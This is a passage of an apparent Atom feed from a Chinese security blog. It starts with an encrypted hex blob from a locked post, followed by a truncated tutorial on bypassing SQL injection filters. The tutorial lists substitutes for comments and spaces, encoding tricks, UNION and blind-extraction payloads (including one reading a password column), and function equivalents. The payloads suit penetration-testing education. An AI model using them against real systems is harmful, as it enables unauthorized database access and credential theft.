d56ebefa99487ef712eb403f8e08a1447f6c0def21109ce3a8e456eb509e51113e1d6afc81cbe18e376bd2aa01d8c3b1fbf76d908083c1ecfad119dcfce23d1d6c7f66e8d94350fecffc0dd3812310ba28df07e1e8eb1360bd947bff7c95791f27b4eff81d03ae9ef49324cff2366abf37cc676444fe281ea71481aee7cf28e7b7d75c245138398aef99a4835df3e8266ec86ac9044a61caf8adfa9958a293a069ac79259633e23d7553b21467e0e6c0d79c78b7d9f73b2cf9e28b70f65fcef82de3c37871440e47b2067eab9d0a71250eb9ca47078777a94b8a9fed5bac6543b08acb3cb9f4f1a7955e55c78bde73c445c2b8a51af8e60aa7909603a9c847b07f24a17a7f9958c0587355d78684e8e64302b44acf616652a759ec62ae9a5db7869452ca5f52d908daab9ddc581cf5e80add9f1e8b2e410f95973b195714214d07aae80acc7ad1ce161c99b7c2e62bdb1e067dc1447c025fe863bac2d37881a64c6529afed39e55ea5f810cabb4a81e965a7f743476bd5cf5965cf3cb67188699e49dee84c37db0ad18d6d556714c24a4e93b28902816ba5343b51b3267a1b1e32635c35bb173f0c221c33dcc382f7601511a1f712ecf2f0e57c5f80de3cff60917acf6d53fe832eb0a20981c40691290a121b714f5694c3bc8e9351d7e6ef8dd341c4e0b0ee53c14036d6157278345fa8ef69ebf51859fa4c036c182a6297616209850012d9c32bf6b1292aa5db153ec74f379213e0a9d76f3400edaa4cb98f2610a0317b9f330f7325e13ab435973779996d7bee3f2877d20be59bae72a2d66839be263fcfa8985463a36ac0c7971b33f4e52d680e4c4ae04774f6f6621909740586fc5157cc223cdbca0f4208db266cb8642ec7cc9193eeb75cd56f996e5a1280fe239384cb03d21bbb0cec4d209e6d9902418258d010055e8093acd50bdbeaa02d0f9e7d51d85871cf95c9bbe4d6aa2ddd5144948131b4e1ec7da404b39166b87b00b6130bc5604330916f08ed8c083181170270d01e26e11e940fa0ab87c9cbd4dde32faf1b453d89567a2024ba76ec1ee75be2657b9f93385aa28c68573fe098dd77d047347ce2b25eb3db8bedad0e35959e242f761f683c798b7fb9af40c4c28928c00c03a36a80a850f32053bf998bdc1970fe9a7b567204b3b64c6b6d03c0e82b60c84d0d3d970f2dec9348ae4a1d1847b46b78a71e5fae86aaf68867f3b0d9f9d95c3c8701d57ab2d3e95a44f3dde2a457e041275b6cd49bade2a12379fa2e277b08c8dfd742078e5f8a438778f0a6981f55f13008c1206c69c54ee9aeefca004c3676d7d52401da3f94f069a6b27a5c7c11cad4adbbf249baeeb419bc6057d6685e1a860be0f39aa23360417bf22687e97bd9d38bc67e613c7c2db7a08c49479a8cf4510b6f9615491e31c4050001b73377510de9041700f30e0e4f0edc9c60cb668373f05641b5a57992ebace1bce82cf83367470c4551d8cc31d6229d25e4d1ecac3d64ec1697ca1bdee3086d721d10358fd9318481e0990cbc64704fec670129815347684b56ecd48cf3332c6f75aafa6e6d216f23407d22c57877543dcd537e67e1a18a0b3f90d48995720b3fde7ea0d9df88e5462db87de856aa3407cb722790eb18c4985fc8d79c118707733172083bba4677709f604d422d89b4cb304d163b2824cc4f5177cd27ce480a48a120868481836593361d9c6d7de62ad59479b11313d5b1e2b5dec09fd797fc894802d340b1cf2e72882ef373883d2126c4261baf5f1399a40b34654b25f7466a8baaf32e404fe218811aaa630ffa672644bba3eda036453dc6b3fdeeacf6c5e13dcbf9f4719c8a82c1ca8005ed3279b27b09b26e3dcdc3d145666171a18dcaffa2e3731d8a1a37c0972ac13f3d4a72cecfe8f02e251e306e62472087455c8aaf2384dcb118296d50cae7d4e7eb4b7f44edd760a002ff1ea4c13ef2788f5b8692b5f5188fa65ef27362f64f543a0599dda89c2590eff9bc034b43efde4b37593b4680980c47453653f0ffcb84abec9bfc52e506b6fb38d446355ee3a6cf1da00d1d1bf1e97a5fb67157d881ffb93bfc124a784c8aa3644da3edbc49bdba5d402180dac89963f143e650a33764ff5f87de5c213785849468b5209563622babc746045e1fb7097470d8cca1131823065fd113d62d0f55a75758bb99dcd07f4159df6f4572841d530e9e0f93d55765c7c9aa9544e129caa7c6349e7bf7695d5618b08bfc67e73249840a0179afe8b976ae9a977aadbc515e6bfea4fa57d00ac170e14dc02c1968a7b81c6f5b08c41e3a395673d7042f9b0b03a0db20542c5a3873e20bf865ceb471f053eaea3fd1efee069fbd7d25730be4fe9afee415f6f696750309795e3cc351986f7f4098f12936757d26a3affd0453fe387331aad98cf98ca7d71681592537fb7dce06da7db5f4b285f34b159de2c1132ca5b655665a46de3e09a25a17760adbf06fe5a8f7e80b878631cae734acf863c79ba629a826cd586a4d970dea3d00abc76d77213b503dd0a6fc82596fea8c37af75404ed590e1edc87be6119031b6fb8cecabbb6ad9d42d54d463fedf33b442ca5227a0fd91c24dd3da19663e6179d8834415d14ed1d75a327d148becf8120e5cdf9df5bfd2e3fcf3fd0ce0758b49c194d448e3c87f9271deb8ef519856e70907c52f8173f2683feca22360e11e1f81f3c136fbf9ffbb6a3502f7a242019baccbff95bfe1a306cca62a76d5314e3d1f4a9612a4dc928132254bed05e3fd39c75b2a154ffd3c4a4891a79053d8035f368c963b23a0db7675f16cad6d4843d5cd5cb5e7e54169f157492cd5fd5ecdeb9e207a49eae583cc4e571ff178d8eb78403d733c4917002de3040b49ea15f358bd27a20fd5382975b36f124f0f448b86bc53ece75560ec803f224a853b452288d10a1efc079cf4d1733c47c799da0c12f9c5eeb2e68ea950b3771cf4c5b5ae77fbbd5f104f2fdae5bb4d634db6019be7c52b43f63ce82fea5b26e7787013c9b4a71a2e215f161657a873439dd526d3d9e8affd5cbb06ca6de28612e23daeae9a60a283d27c06c4fe8292d3ac1ed8546bab2bc9547c994514aacfce7cad0d46ddfcfe3e56146487af61e8df3dc5781c7d1ae7f99eed2f76b0038c29070865688717328e2f344254a09c97e3f52f13997622e4f50fcfb5e98db44f663b7ef7c183a8d6b86b33c11a1a4bccbc71765147bfa9eaa0c0f99b4a4d1453af3f8e0fbdaacd04e5d5af316da1f32fd737d75b25aeb92a6dddb735c9fc2a555cdc786a9ad0cca7e057b9ccf433e022596401c3f909e44917d9a1b902b3bee38c49ce753da8a4520caf2c7525d3d1e3693b0095f1fea5ed9b8ddfd04ab8ff79bc87a705a1f040a4578b760a1f383bacf090c004f0fbfc38c7dee5307846025517872584f70317eb1e721707871a8e626824c5f0dad8d9f4023529245f8766aa876bab48e03332e74d459aeb91622c34106fe3d1162354778e84ba46ef25808fe870819a959e7844b1a98fdf4d23ed26ef54eb13d4b242bd60c3075422f9f6126945e2c8e971b2599ce186078303d756d1f9d0e6a2d04dbae9712197537d8355fb93d3875605dd0f000bde722d4ef5eefa8b4332f693ef84fe41abbf1c27bf910c5c08adfd4111c0b49ed10c1909b7e1425ef893d63f7ebae4e548768f7392e1e0afbc9245e972d5c12d9bbac49f213940d117937b3e3c7714d414df2cb225fa969f04e41eb11c2bf7a4b62d99f4a14d73f13dc84409957c50c9bd170aada19f8535422fb47cb936d5dbebecda437f23891b44b6f2f44d94704f793a1223ae10a2b9150c5a84c5e3fa4acdb2f009181ceec8329473236a6141e27dc4946edf5ecae0710cf703d85288ce3a0f0fdfaa35d6026fa375100eb32b4efb2e511912cc16d9fbfe09daa92c57270fbdb2cce1c926170c5f2b3af2a929a7152fc522f363d9581f393280cd854b384ea80b822d3982a5d95d20587f4910d86ffd6741662f2276b0c8a5a9d8c629fc07bdb209fa50d3363f2b3e067d64e1aa887c91214e5520d7a6124d869bc1af3a20d2afbd4c5056c5bd6789f2ba219f98af2130a7a859b193670a295edc558da062117823b0c2f3412781c1e13b9906560e74e5d411a598e1a35c21cb1e2fd5163387fb0a6444f6c72f568416e5e338b039fb75aff63648b33ff5970fef0ddb188dd90a60183734715b7b157fc30cd0435c9eb80d1a01aec1a459c0a611d6d262a17c7c10bcd19ad798d8ca02e86320a76a4d25e41a991a8420d75c7662cf114c3fb8c49110a21690f9fb0fe8d72f68ce07da14df7da919928144c2b69b67b77b6f2e96477ea9ac256250eac1d32e8ed8221f9623ff69e5eb4044009e5d2a96ca731a3a03cf442099a4fddfc5cfd58cd49c62b4bffb5763f598eb7f3dcf75d73ab0b57d6df7892418192359f7f0d2cecc116c32805ebf9833aafc12794c13d1ba02d040acea5b8a506c7af02135c5f7c58e79a555b2433644997f2b29448826f44a2e9499bd1fc253a61416739f9e8b122d7254be233f719d222a01714e285a66d10a78b051107535c2c4aa86ef175e4098f2d6b450877678add80da5f6f0d575046dc0d2edd66f3bdeda16473b4450349df35d175f4e70a4330dd52fc10eedd4e63b236e25900ba59892696568793a6b7263e248ec308ccf52211cc030f9a59f919fb564907d412037063e8b31a03c8aee88702c2b65e4986ebbdca37ff45d76ede46caf1e40f4a55eadaa5bb6249a2e758b2664fb8add486f315f6a43b0cd9db0b388652b382fcb5258964d7f0362fac7a4fcd725f59cac534815dff9a30d8f471b9a3df1040817cee3bb702b31ec213c8c08e0877562c8ae3bfd90d078c087f73ba0abc63e106157974cc44b07f3d0e07523fe0fcf98152974144d152d452ee4040490591f433307e1544df707106461d0cbff38b7d7065dfccb21b32cad45aebb26a4e66a5ed6c79c7a74664a1043778f4fab2f1a5bcff6c7d765d5f37f82c51d261ac55ff93b924e4c78797cbad42c2a5864c195ca0760eb30376e4e463b31d2761e9796c1a4810aa115a9a0154badaf9dd5fe5676fd62d33b3c1e396f7ea9d73d2db13264e414ef3c5beb6721ec04f35a4e5a74cfcfa7120fa52d2f8919f8c8995126f2ec5e88e1f2e47104d415b1527dada2ff6fcf4910add262a8c7e610077d6a5466ade0eb0bdf71ba7d05b4b9f5a95df59fc0e81cdd36249750d4c436e5296a7d5e28f9923eb51d60f7b5150977ba5aa301f45684658d274d122584a69cbbe4a7780f1707616d9c221c1e9a51348607a21da0ad631f3f0bfc5107cbf6704ac66225ff287459fa8c2751b68671b23b67c313992eb9c588fa16ee89ca41a6b1ddba3d58dfa606438d138765767a1c9bb2639602f246cacf36e3d48b9c57518fb1742575bef1124cfcbe541b7952c635754fd384f6ab26c97c15db7f25c88c82de4d4c9ccff007c123853913c43cd94bf8fd795290f9b92c2b512dd2cc653f96b4a2b4592e28e616ee20d392a586d3090dcca5a2b6b1e36fb4203e8ec2bbd4a9caedc78b5dc6108a854187422f20178ba88c9c5970b1578921086e1514e389f6c0e3f84f8e4c6d3263c06f271e38c89783a75ba51948e408c5072b3d2f0fcce1bc9d4c9d3f4180176d423ba6b7338400fd940d644503a29617be8b96f8d6aec38b908d0bab8897126e2bae03bfaa889919b271ed827824be09b3080c17ae0fef214af6f2d1d6d4998a44b7f59d665ff31d84ad5ca8fb67f530c73efa2e58106de49cbe06d8b29991d30b3a016eb908e8973232950bb7978a69757ac22e5a19dd942a60df66da29be78a38b9b519ec6e32542e45ac4b656c1a55af8a86dddc453706ca1a854703f67b98f231f61d73dbe8003e6debf0a33994786d24b1aa2eceefdec17ae1fbaf73fae98d4b6b22206a98da660406db1f524a7666e01ff734f391e3e5dd03c556675af33aac9371975f561179c6922c5a3b474d6e1cf9798b5c64304ae1cfd272997e36f7ff0d99abce1d9e38c289a924f113261e55e45bfa07596127a382b12942db8093af5d78fe721792fc1588ff440ae90200bda232fc7bdc47d6a75217ed040d2f018cf58e2406222cefa55f37456e433eceae69cc93ccfc4d28503494ea3407a2dbdbb3475d411aa510c39d53c8b832f44f03acb7cb55f3deb571f65f3c8561efdc0bc2a063ba9cf5cc0efd476e41e49b8060e40c69148366f97f276018e198df91ce241630947b915fdc22219946285dea88f814c65707bd880498ed948771642e11d77caf22daf33f5c4504706c4eaf7963a6305b5d26a54c0b99b1f911b32775819ff1bc1e5b59e5e917169e5c225a508400a32cea987131e5ee67f38e5aaad23e1429ade6af2d0793c7d9aa13c7fec519fff001f9521230dd2f359c869bcfcac90d0c3060dc538232b63b7d6a82ed386260fcd4f6ddec76922d273d8c5a75bd59b19778d4e0230d11bbed33b8210c42082e2a4d1518ac0de04a321f8fb5dace458cfa8dd405f4a67328903bd03025b07ce9df4535b289d2522d231ed8a155c25d398f782b00bf94952ca8217d80cc1fb1f0a5e7c291aa42eb1d5410251eaefffa41397568a6f85d34bcf6880029b32f450e94448b6f7d711bb6d212a4560a96531f095a4dde58122f897e696bc7a401a0c2c428b587d24b0e9e9eb0bfe0f976be5e372e87756c0694510619f7b7332b0a4fc4fd964275aa595174dad5e25e37b94a23abc28e1bfd89c1d346954df4df215338ed0b2057b12d352cb90dc21f15909cf72e1f053df7a3638f191a885e778d32509dd44135b489f12c429bda36894998e846c565cb8e84813867442d4f6328f39ae1721631c780b42bd79e81833a8fd66689e1cecdc741b6e2a10668d3603632f50618815555fbb616b4aa94de254df5f27aba9ce5c4dfb66380a24a818a9f02b4ae35409d5393314b34570785e3e543707a7f1d52d6b3db1776b9b7b60d12b6d857d1fd8ebde5b6c0cbbb6167d6865a4d745bf52ac2ca9f10d114045908092b4e95a4657073afdeae963ed20d66b95ea6380b7e938301b9e06cb9f7d4227659887f7078db9a47840a17025bfca8c42215257f388e6c97117125fd9bbb73d0f9b4f833de124549442f22a947de98ae4cfc72bf0ba4a2898f8ac89b88fdb6ef81a870fae2c623ca46a76422d740fdbb60b6e160fef10523e626c53cf9807abbf1f204190ff93788540f017a23aa0cf5fda748bfa3dcaf2161d032ef0d51c4ce8842932b7c0b116ebe5309789f6012047288cb39d17d92a3c98441e5764fb47472c77d4303c0ce08975b92564165fa1df670121079f780e0100c2b1206478321830a4df3de8d92592f61bd02305ec3342ccc2222293fd8a1a481330d03474ac1f54d1660e93746562bc60240e3fc9d1c5468dded12603bef5beda8d2f3539978b6857ecfe1422cd1e0ce2e2dc41ef7062b37099644a11f4366ca650715507a25dd4d233c3d0de92f241683cc2557fc236b68c87c51ce210e239c13ac3db92c082c7f0362ffab0482a754d45f9a8689ff631aff7b0390743fddbadd59618a95428a6afb9ee8793a6886a08e62500003388560f26d0cab6de615b21d34735ac0a7c75ca39f29628116734896137e7266a918698909409943c50c74cc431972fd90593c9a0eedd8f9da16606134e99eb5f9f6df815e7b49d72909d1b52f08e7a50cd30de9077b275ef081184b11093d610622be687bd93fcca0adf8f4b5b93d85385e54697e88fb4e00803f95c9ce936da67be75275483d632b607952b921caf48237dc8873741f87a06173f2b0cfa6cfc338d650c632f9631caa435834cf1ac6b3957e5a17140c9ce6445216cac8be6b19cbd6fca6a524368a6adfec293eb3b048754103b065fb8e5f84a800a670b4930b4e198b18d15a53ac692232674a532d369c9ee5388eedc23427d9afba9f07820df3b1e9683cf54f5f6f5f0b5e1ad205edd00c84b926c3815a8f94dda0be21860657b9806a44aa47f1ae43365884092adee4d03e0132e82ffad5c415ac4b5f2aef66e465962fa7799ce30cdda3d5e4fdf2668dc4770f83a7a9635e13d96faa511ebcc534341a71055ff70f53fda27f86a920573cd81f82a51a4516c4c7f86942eeeb9bf77541d9e7cc8f259a9ca6376ccc1e703bd2aee250c3ac6c7687bc3072c3478b5c44e3df8ccf6b76ecca322224243f68fca736c8f4655ee6a6b0e29fc0a745d8e33a91a83c45ec5c724508c25a759fe493448753e7fd18a7d5f0a15b5f9e3d4f029add255fc5893208a6323fbc44377c7d5b01da5beba129b5fff9fc14c7ec68afb9d9a57e52217b3dc83b89c2ca96bd6dc93d7f1e77e03dd8743db19a754846bb97d13c5df76ef0c4b94f42326cd30745af8e5e0b534940643055789f25b7092eaa0c2afeeae61f499422030f32c3114eec99761bc75389bfff51ced348946dc60e2aeb88082a2d52123b42527ae10468c62af3bcadf667ea49271a738dfd24e325f81d6ed267130c65619debf6eca10e4f4cd9081e653a7de93ec2c024b54b4c83b3b7b26906a2d60723f24f344c0f5256084433e74350bfe0b3c73a0ab2d5345f9ab12b9ebb831c6260e534e6e0e342581b07d3afe4708a3817ae80d61e3b5377c597b52a0556d0a3e91b41c2c9244f53712a60ab72fc040dd9187c9b62d5751494359abd8685d125a70073e521841381cf79e1e72e96e85ea54cb73ab183bb0e182ecb7412f6bcc5eb22e4745c6bbc15c2f7fc12274779b67bb6335eef569134392f7620de99a638a7b100873d70a2798292a13103155b0f7654aa68004d5800effd3e6cdd75f5b64b849d74ee1017b3bc7ad6b5baf666103b6c4bf4b91b167c2a66afe227c4bc1d50fc165c9e3034a1d51e0bec92f44f14d623d966999d1e3519e8fa8879c2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过笔记(一)</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html</id>
    <published>2020-02-25T07:46:56.000Z</published>
    <updated>2020-03-02T02:59:16.257Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure><p>一般是使用/**/来绕过过滤空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure><p>上面两条语句执行结果是一样的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image"><p>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image"><p>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。</p><a id="more"></a><p>这里来了个知识点：怎么绕过过滤空格加注释符的sql注入？<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>我们可以使用/**/ 块注释或者一些url编码的特殊字符(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or ‘1’=’1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</p><p><strong>在本地测试的时候不能直接把%09等特殊字符放到sql语句中，必须经过url解码。</strong></p><p>其他可以代替空格的方法：<br><strong>浮点数代替空格</strong></p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/3.png" class title="This is an test image"><p><strong>科学计数法代替空格</strong></p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/4.png" class title="This is an test image"><p><strong>括号绕过()</strong><br>在进行空格的时候需要注意：不是所有的语句都支持括号代替空格的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/5.png" class title="This is an test image"><p><strong>所以进行括号绕过时，需要在本地测试看语句是否支持括号。</strong><br><strong>加号减号绕过(+,-)</strong><br>进行绕过时最后将+和-进行url编码。<br>和括号绕过一样，对于有些语句是不支持的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/6.png" class title="This is an test image"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;号绕过</span><br><span class="line">select * from&#96;users&#96;;</span><br></pre></td></tr></table></figure><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/7.png" class title="This is an test image"><p>同上面一样对于一些语句也是不支持。</p><p><strong>~,!,@,+,-,””,’’,{}等特殊字符绕过空格。</strong><br>这些绕过过滤的空格的字符，在一些语句都是不支持的，需要在本地经过测试才行。</p><hr><h4 id="sql函数和关键字"><a href="#sql函数和关键字" class="headerlink" title="sql函数和关键字"></a>sql函数和关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure><hr><h3 id="0x02-绕过过滤"><a href="#0x02-绕过过滤" class="headerlink" title="0x02 绕过过滤"></a>0x02 绕过过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>数据库对大小写不敏感，如果后台代码只过滤的小写的关键字，我们可以通过大小写混合来绕过。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/8.png" class title="This is an test image"><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>这个mysql才有的特性: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!关键字*&#x2F;</span><br></pre></td></tr></table></figure><p>上面的代码会没数据库解析执行为sql语句。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/9.png" class title="This is an test image"><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.URL编码<br>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT<br>2.十六进制编码<br>常用的是对参数进行十六进制编码，对一些关键字最好不用编码。<br>3.Unicode编码<br>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了看一下常用的几个符号的一些Unicode编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号: %u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>%20 %09 %0a %0b %0c %0d %a0 /**/  这些都可以替换空格。</p><p><strong>当这些字符都被过滤时，我们可以使用括号将子查询包含起来:任何可以计算出结果的语句，都可以用括号包围起来。</strong></p><h4 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin()，ord() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((select &#39;password&#39;),1,1) &#x3D; 0x70</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x69) &#x3D; 1</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x70) &#x3D; 0</span><br><span class="line">strcmp(left(&#39;password&#39;,1), 0x71) &#x3D; -1</span><br></pre></td></tr></table></figure><h4 id="特殊函数绕过"><a href="#特殊函数绕过" class="headerlink" title="特殊函数绕过"></a>特殊函数绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 